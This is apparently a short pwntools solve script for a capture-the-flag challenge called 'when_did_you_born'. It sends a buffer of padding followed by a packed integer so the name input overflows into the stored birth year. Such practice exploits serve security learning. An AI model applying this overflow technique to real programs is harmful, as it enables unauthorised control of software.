from pwn import *

p = process('./when_did_you_born')

p.sendlineafter("Birth?\n",str(1998))
payload = 'aaaaaaaa'+p32(1926)
p.sendlineafter("Name?\n", str(payload))
print p.recvall()
